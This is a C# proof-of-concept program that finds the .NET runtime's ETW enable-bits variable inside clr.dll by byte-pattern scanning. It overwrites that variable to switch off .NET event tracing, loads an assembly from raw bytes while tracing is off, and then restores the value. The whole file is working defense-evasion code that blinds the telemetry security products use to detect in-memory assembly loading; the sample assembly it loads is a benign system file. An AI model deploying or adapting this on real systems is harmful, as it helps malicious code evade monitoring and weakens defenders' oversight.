using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace SubscriberBitPatch {
    internal class Program {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        static int getClrSize(IntPtr clrBase) {
            Console.WriteLine("CLR Base: " + clrBase.ToString("X"));
            int peOffset = Marshal.ReadInt32(clrBase + 0x3C);
            IntPtr optionalHeaderPtr = clrBase + peOffset + 0x18;
            int sizeOfImage = Marshal.ReadInt32(optionalHeaderPtr + 0x38);
            Console.WriteLine("CLR SizeOfImage: 0x" + sizeOfImage.ToString("X"));

            return sizeOfImage;
        }

        static IntPtr GetImageBase(String dllName) {
            foreach (ProcessModule module in Process.GetCurrentProcess().Modules) {
                if (module.ModuleName.Equals(dllName, StringComparison.OrdinalIgnoreCase)) {
                    return module.BaseAddress;
                }
            }
            return IntPtr.Zero;
        }

        static IntPtr FindDotNETRuntimeEnableBits() {
            IntPtr clrBase = GetImageBase("clr.dll");

            Console.WriteLine("clr.dll located at " + clrBase.ToString("X"));

            int clrSize = getClrSize(clrBase);
            IntPtr clrEnd = clrBase + clrSize;

            String[] pattern = new string[] { "f7", "05", "??", "??", "??", "??", "00", "00", "00", "80" };

            Dictionary<IntPtr, int> globalVarCount = new Dictionary<IntPtr, int>();

            for (long addr = (long)clrBase; addr < (long)(clrEnd - pattern.Length); addr++) {
                for (int i = 0; i < pattern.Length; i++) {
                    if (pattern[i] == "??") {
                        continue;
                    }

                    int b = Marshal.ReadByte((IntPtr)addr + i);
                    int target_b = Convert.ToInt32(pattern[i], 16);

                    if (b != target_b) {
                        break;
                    }

                    if (i != pattern.Length - 1) {
                        continue;
                    }


                    int globalVarOffset = Marshal.ReadInt32((IntPtr)addr + 2);
                    IntPtr rip = (IntPtr)(addr + pattern.Length);
                    IntPtr globalVarAddr = rip + globalVarOffset;

                    if (globalVarCount.ContainsKey(globalVarAddr)) {
                        globalVarCount[globalVarAddr]++;
                    } else {
                        globalVarCount[globalVarAddr] = 1;
                    }
                    //Console.WriteLine("Signature found at: 0x" + addr.ToString("X"));
                }
            }

            IntPtr topAddr = IntPtr.Zero;
            foreach (var item in globalVarCount) {
                if (topAddr == IntPtr.Zero || item.Value > globalVarCount[topAddr]) {
                    topAddr = item.Key;
                }
            }

            return topAddr;
        }

        static void TurnOffETW(IntPtr DotNETRuntimeEnableBits_addr, out int DotNETRuntimeEnableBits_val) {
            DotNETRuntimeEnableBits_val = Marshal.ReadInt32(DotNETRuntimeEnableBits_addr);
            Marshal.WriteInt32(DotNETRuntimeEnableBits_addr, 1);
        }

        static void TurnOnETW(IntPtr DotNETRuntimeEnableBits_addr, int DotNETRuntimeEnableBits_val) {
            Marshal.WriteInt32(DotNETRuntimeEnableBits_addr, DotNETRuntimeEnableBits_val);
        }

        static void Main(string[] args) {
            IntPtr DotNETRuntimeEnableBits_addr = FindDotNETRuntimeEnableBits();

            int DotNETRuntimeEnableBits_val = 0;
            TurnOffETW(DotNETRuntimeEnableBits_addr, out DotNETRuntimeEnableBits_val);
            Console.WriteLine("DotNETRuntimeEnableBits_val: 0x" + DotNETRuntimeEnableBits_val.ToString("X"));

            // filename is the .NET assembly executable on disk to load. 
            String filename = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegAsm.exe";
            Byte[] bytes = File.ReadAllBytes(filename);
            Assembly asm = Assembly.Load(bytes);
            Console.WriteLine(asm);

            // because ETW is turned back on, upon termination of the process, an AssemblyUnload event for RegAsm is logged.
            TurnOnETW(DotNETRuntimeEnableBits_addr, DotNETRuntimeEnableBits_val);
            Console.WriteLine("Microsoft_Windows_DotNETRuntimeEnableBits_addr: 0x" + DotNETRuntimeEnableBits_addr.ToString("X"));
        }
    }
}